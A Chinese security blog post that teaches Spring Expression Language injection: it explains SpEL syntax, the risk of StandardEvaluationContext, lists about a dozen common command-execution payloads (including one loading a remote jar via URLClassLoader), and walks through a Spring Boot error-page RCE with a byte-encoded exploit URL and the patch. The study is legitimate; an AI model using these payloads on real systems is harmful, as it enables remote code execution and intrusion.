+<h4 id="1、类表达式"><a href="#1、类表达式" class="headerlink" title="1、类表达式"></a>1、类表达式</h4><p>SpEL中可以使用特定的Java类型，经常用来访问Java类型中的静态属性或静态方法，需要用<code>T()</code>操作符进行声明。括号中需要包含类名的全限定名，也就是包名加上类名。唯一例外的是，SpEL内置了<code>java.lang</code>包下的类声明，也就是说<code>java.lang.String</code>可以通过<code>T(String)</code>访问，而不需要使用全限定名。<br> 因此我们通过 <code>T()</code> 调用一个类的静态方法，它将返回一个 <code>Class Object</code>，然后再调用相应的方法或属性，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        Expression exp = parser.parseExpression(&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;calc.exe\&quot;)&quot;);</span><br><span class="line">        Object value = exp.getValue();</span><br></pre></td></tr></table></figure>
+
+<h4 id="2、方法调用"><a href="#2、方法调用" class="headerlink" title="2、方法调用"></a>2、方法调用</h4><p>使用典型的Java编程语法来调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// string literal, evaluates to &quot;bc&quot;</span><br><span class="line">String c = parser.parseExpression(&quot;&#x27;abc&#x27;.substring(2, 3)&quot;).getValue(String.class);</span><br><span class="line"></span><br><span class="line">// evaluates to true</span><br><span class="line">boolean isMember = parser.parseExpression(&quot;isMember(&#x27;Mihajlo Pupin&#x27;)&quot;).getValue(societyContext,Boolean.class);</span><br></pre></td></tr></table></figure>
+
+<h4 id="3、调用构造函数"><a href="#3、调用构造函数" class="headerlink" title="3、调用构造函数"></a>3、调用构造函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Inventor einstein = </span><br><span class="line">  p.parseExpression(&quot;new org.spring.samples.spel.inventor.Inventor(&#x27;Albert Einstein&#x27;,&#x27;German&#x27;)&quot;).getValue(Inventor.class);</span><br><span class="line"> </span><br><span class="line">//create new inventor instance within add method of List</span><br><span class="line">p.parseExpression(&quot;Members.add(new org.spring.samples.spel.inventor.Inventor(&#x27;Albert Einstein&#x27;, &#x27;German&#x27;))&quot;).getValue(societyContext);</span><br></pre></td></tr></table></figure>
+
+<h4 id="4、Bean引用"><a href="#4、Bean引用" class="headerlink" title="4、Bean引用"></a>4、Bean引用</h4><p>如果解析上下文已经配置，则可以使用<code>@</code>符号从表达式中查找bean。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser(); StandardEvaluationContext context = new StandardEvaluationContext(); context.setBeanResolver(new MyBeanResolver()); </span><br><span class="line">// This will end up calling resolve(context,&quot;foo&quot;) on MyBeanResolver during evaluation </span><br><span class="line">Object bean = parser.parseExpression(&quot;@foo&quot;).getValue(context);</span><br></pre></td></tr></table></figure>
+
+<h4 id="5、变量定义"><a href="#5、变量定义" class="headerlink" title="5、变量定义"></a>5、变量定义</h4><p>变量定义通过<code>EvaluationContext</code>接口的<code>setVariable(variableName, value)</code>方法定义；在表达式中使用<code>#variableName</code>引用；除了引用自定义变量，SpEL还允许引用根对象及当前上下文对象，使用<code>#root</code>引用根对象，使用<code>#this</code>引用当前上下文对象</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">EvaluationContext context = new StandardEvaluationContext(&quot;rui0&quot;);</span><br><span class="line">context.setVariable(&quot;variable&quot;, &quot;ruilin&quot;);</span><br><span class="line">String result1 = parser.parseExpression(&quot;#variable&quot;).getValue(context, String.class);</span><br><span class="line">System.out.println(result1);</span><br><span class="line"> </span><br><span class="line">String result2 = parser.parseExpression(&quot;#root&quot;).getValue(context, String.class);</span><br><span class="line">System.out.println(result2);</span><br><span class="line">String result3 = parser.parseExpression(&quot;#this&quot;).getValue(context, String.class);</span><br><span class="line">System.out.println(result3);</span><br></pre></td></tr></table></figure>
+
+<h4 id="6、用户自定义的方法"><a href="#6、用户自定义的方法" class="headerlink" title="6、用户自定义的方法"></a>6、用户自定义的方法</h4><p>用户可以在SpEL注册自定义的方法，将该方法注册到<code>StandardEvaluationContext</code> 中的<code>registerFunction(String name, Method m)</code>方法。<br> 如：我们通过JAVA提供的接口实现字符串反转的方法。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public abstract class StringUtils &#123;</span><br><span class="line"></span><br><span class="line">  public static String reverseString(String input) &#123;</span><br><span class="line">    StringBuilder backwards = new StringBuilder();</span><br><span class="line">    for (int i = 0; i &lt; input.length(); i++) </span><br><span class="line">      backwards.append(input.charAt(input.length() - 1 - i));</span><br><span class="line">    &#125;</span><br><span class="line">    return backwards.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过如下代码将方法注册到<code>StandardEvaluationContext</code>并且来使用它</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">StandardEvaluationContext context = new StandardEvaluationContext();</span><br><span class="line">context.registerFunction(&quot;reverseString&quot;,                      StringUtils.class.getDeclaredMethod(&quot;reverseString&quot;,new Class[] &#123; String.class &#125;));</span><br><span class="line">String helloWorldReversed = parser.parseExpression(&quot;#reverseString(&#x27;hello&#x27;)&quot;).getValue(context, String.class);</span><br></pre></td></tr></table></figure>
+
+<h4 id="7、模板表达式"><a href="#7、模板表达式" class="headerlink" title="7、模板表达式"></a>7、模板表达式</h4><p>表达式模板允许文字文本与一个或多个解析块的混合。 你可以每个解析块分隔前缀和后缀的字符。当然，常见的选择是使用<code>＃&#123;&#125;</code>作为分隔符，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String randomPhrase = parser.parseExpression(</span><br><span class="line">        &quot;random number is #&#123;T(java.lang.Math).random()&#125;&quot;,</span><br><span class="line">        new TemplateParserContext()).getValue(String.class);</span><br></pre></td></tr></table></figure>
+
+<p>在<code>ParserContext</code>接口用于影响如何 表达被解析，以便支持所述表达模板的功能。的<code>TemplateParserContext</code>的定义如下所示</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329142052563-1185828549.png" alt="image-20220329142053427"></p>
+<h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>在不指定<code>EvaluationContext</code>的情况下默认采用的是<code>StandardEvaluationContext</code>，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329144847462-176527755.png" alt="image-20220329144848681"></p>
+<p>看下SpEL提供的两个<code>EvaluationContext</code>的区别：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</span><br><span class="line">StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</span><br></pre></td></tr></table></figure>
+
+<p><code>SimpleEvaluationContext</code>旨在仅支持SpEL语言语法的一个子集。它不包括 Java类型引用，构造函数和bean引用。所以说指定正确<code>EvaluationContext</code>，是防止SpEl表达式注入漏洞产生的首选，之前出现过相关的SpEL表达式注入漏洞，其修复方式就是使用<code>SimpleEvaluationContext</code>替代<code>StandardEvaluationContext</code>。</p>
+<h3 id="常用的payload"><a href="#常用的payload" class="headerlink" title="常用的payload"></a>常用的payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、$&#123;12*12&#125;</span><br><span class="line">2、T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)T(Thread).sleep(10000)</span><br><span class="line">3、#this.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc.exe&#x27;)</span><br><span class="line">4、new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;&#125;).start()</span><br><span class="line">5、T(java.lang.Runtime).getRuntime().exec(&quot;cmd.exe /c calc.exe&quot;)</span><br><span class="line">6、T(Runtime).getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;&#125;)</span><br><span class="line">7、new javax.script.ScriptEngineManager().getEngineByName(&quot;nashorn&quot;).eval(&quot;s=[2];s[0]=&#x27;cmd.exe&#x27;;s[1]=&#x27;/c calc.exe&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;)</span><br><span class="line">8、new javax.script.ScriptEngineManager().getEngineByName(&quot;javascript&quot;).eval(&quot;s=[2];s[0]=&#x27;cmd.exe&#x27;;s[1]=&#x27;/c calc.exe&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;)//调用ScriptEngine，js引擎名称可为[nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</span><br><span class="line">9、new java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL(&quot;http://127.0.0.1:8999/Exp.jar&quot;)&#125;).loadClass(&quot;Exp&quot;).getConstructors()[0].newInstance(&quot;127.0.0.1:2333&quot;)//URLClassLoader远程加载class文件，通过函数调用或者静态代码块</span><br><span class="line">10、T(ClassLoader).getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;cmd.exe /c calc.exe&quot;)  //AppClassLoader加载</span><br><span class="line">11、T(ClassLoader).getSystemClassLoader().loadClass(&quot;java.lang.ProcessBuilder&quot;).getConstructors()[1].newInstance(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;&#125;).start() //AppClassLoader加载</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="SpringBoot-SpEL表达式注入漏洞"><a href="#SpringBoot-SpEL表达式注入漏洞" class="headerlink" title="SpringBoot SpEL表达式注入漏洞"></a>SpringBoot SpEL表达式注入漏洞</h4><p>原理</p>
+<ul>
+<li>spring boot 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</li>
+<li>此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</li>
+<li>其中 ${} 包围的内容都会被  <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的  <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li>
+</ul>
+<p>环境</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce">https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce</a></p>
+<p>验证</p>
+<p>请求<a target="_blank" rel="noopener" href="http://127.0.0.1:9091/article?id=$%7B2*2%7D">http://127.0.0.1:9091/article?id=${2*2}</a></p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329171117202-1289875588.png" alt="image-20220329171118750"></p>
+<p>对执行的命令进行十六进制编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># coding: utf-8</span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line">target = &#x27;calc&#x27; # 自己这里是windows环境，所以测试命令用的是calc</span><br><span class="line">for x in target:</span><br><span class="line">    result += hex(ord(x)) + &quot;,&quot;</span><br><span class="line">print(result.rstrip(&#x27;,&#x27;))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>将字符串格式转换成 0x** java 字节形式，因为这里会将我们的payload中的单引号和双引号进行编码，导致SpEL表达式解析失败，所以为了方便执行任意代码，可以根据String类的特性传入byte数组：</p>
+<p>分析过程参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bitterz/p/15206255.html">https://www.cnblogs.com/bitterz/p/15206255.html</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9091/article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new String(new byte[]&#123;0x63,0x61,0x6c,0x63&#125;))&#125; </span><br></pre></td></tr></table></figure>
+
+<p>开启调试，造成的原因主要是在<code>ErrorMvcAutoConfiguration.java</code>中的<code>SpelView</code>类，可以看到是在<code>this.helper.replacePlaceholders(this.template, this.resolver)</code>中生成了错误页面，然后返回给result并响应</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329184704655-640679280.png" alt="image-20220329184706224"></p>
+<p>此时map的值如下</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329185821845-924507104.png" alt="image-20220329185823363"></p>
+<p>其中template内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Whitelabel Error Page&lt;/h1&gt;&lt;p&gt;This application has no explicit mapping for /error, so you are seeing this as a fallback.&lt;/p&gt;&lt;div id=&#x27;created&#x27;&gt;$&#123;timestamp&#125;&lt;/div&gt;&lt;div&gt;There was an unexpected error (type=$&#123;error&#125;, status=$&#123;status&#125;).&lt;/div&gt;&lt;div&gt;$&#123;message&#125;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>跟进函数replacePlaceholders</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329190024398-1003926971.png" alt="image-20220329190025935"></p>
+<p>继续跟进while循环中循环解析${}中的 表 达 式 ，例如第一个解析到${timestamp}的表达式</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329212020428-2110315097.png" alt="image-20220329212021872"></p>
+<p>然后通过resolvePlaceholder函数进行SpEL解析，跟进即可看到通过getValue方法对SpEL表达式进行解析</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329212531370-1367392607.png" alt="image-20220329212532940"></p>
+<p>且<code>EvaluationContext</code>设置的为<code>StandardEvaluationContext</code>，根据前面我们可以知道它允许用户控制输入的情况下可以成功造成任意命令执行</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329212843266-47854455.png" alt="image-20220329212845027"></p>
+<p>当解析${message}时，我们跟踪下resolvePlaceholder函数，看看它是怎么处理的</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329214604858-144904379.png" alt="image-20220329214605998"></p>
+<p>通过getValue从Context从取出message的值</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329215544902-59410262.png" alt="image-20220329215545883"></p>
+<p>跟进</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329220031215-1991450169.png" alt="image-20220329220033014"></p>
+<p>就是对message的值进行html编码</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329220356553-1188508612.png" alt="image-20220329220358206"></p>
+<p>编码完之后，可以看到message中的双引号被转换为html编码，所以这里编写命令执行的payload，不能带单引号和双引号，这也是为什么采用byte数组传递命令的原因了</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329220705475-2061816981.png" alt="image-20220329220705931"></p>
+<p>接着往下就又是递归函数，获取proVal中${}中的值，然后进行SpEL表达式解析</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329221109578-1370501255.png" alt="image-20220329221111197"></p>
+<p>往下，就是得到${}中的值，然后就是调用resolvePlaceholder进行解析</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329221432770-915349157.png" alt="image-20220329221434377"></p>
+<p>跟下，执行到getValue()方法就会对传进去SpEL恶意表达式进行解析，触发命令执行，弹出计算器</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329221908395-113622263.png" alt="image-20220329221907429"></p>
+<p>补丁是创建了一个新的<code>NonRecursivePropertyPlaceholderHelper</code>类，来防止递归解析路径中或者名字中含有的表达式。<br>详见： <a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6">https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6</a></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="http://rui0.cn/archives/1043">http://rui0.cn/archives/1043</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_31481187/article/details/108025512">https://blog.csdn.net/qq_31481187/article/details/108025512</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9245#toc-11">https://xz.aliyun.com/t/9245#toc-11</a></p>
+
+    </div>
+
+    
+    
+    
+      
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>kpa1on
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://kpa1on.github.io/2022/03/29/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="SpEL表达式注入学习">https://kpa1on.github.io/2022/03/29/SpEL表达式注入学习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E6%B3%A8%E5%85%A5/" rel="tag"># 注入</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/03/29/Spring%20Cloud%20Function%20SpEL%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/" rel="prev" title="Spring Cloud Function SpEL漏洞分析及复现">
+                  <i class="fa fa-chevron-left"></i> Spring Cloud Function SpEL漏洞分析及复现
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/03/31/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/" rel="next" title="Java安全之Commons Collections1分析（一）">
+                  Java安全之Commons Collections1分析（一） <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kpa1on</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">145k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:12</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共37.9k字</span>
+  <span class="post-meta-divider">|</span>
+  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  <span class="post-meta-divider">|</span>
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  <span class="post-meta-divider">|</span>
+  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</div>
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
